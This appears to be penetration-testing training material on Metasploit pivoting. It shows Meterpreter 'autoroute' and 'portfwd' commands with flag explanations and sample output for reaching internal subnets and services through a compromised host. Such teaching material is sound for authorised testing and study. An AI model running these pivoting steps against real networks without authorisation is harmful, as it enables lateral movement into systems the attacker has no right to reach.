Meterpreter & `autoroute`

# After establishing a Meterpreter session:
meterpreter > run autoroute -s 192.168.10.0/24

# Explanation:
# -s: Specifies the subnet to route traffic to.
#     Metasploit will add a route through the current
#     compromised host to reach this network.

# Example Output:
# [*] Running module against SERVER01
# [*] Adding a route to 192.168.10.0/24...
# [+] Route added.
# [*] Autoroute module finished.
Automated Routing

`autoroute` simplifies pivoting by automatically configuring Metasploit to route traffic for specified subnets through the compromised host.

`portfwd` for Specific Services

# After establishing a Meterpreter session:
meterpreter > portfwd add -l 8080 -p 80 -r 192.168.10.5

# Explanation:
# -l 8080: Local port on your Kali machine
# -p 80: Remote port on the target
# -r 192.168.10.5: Remote IP address of the internal target

# Example Output:
# [*] Local TCP relay created: 127.0.0.1:8080 <-> 192.168.10.5:80

# To list active forwards:
meterpreter > portfwd list

# To remove a forward:
meterpreter > portfwd delete -l 8080
Direct Service Access

`portfwd` allows you to forward a specific port from an internal target to your local machine, making a single service directly accessible.

Key Takeaway

Metasploit's `autoroute` and `portfwd` modules provide powerful, integrated capabilities for routing and forwarding traffic through compromised hosts, simplifying complex pivoting operations.
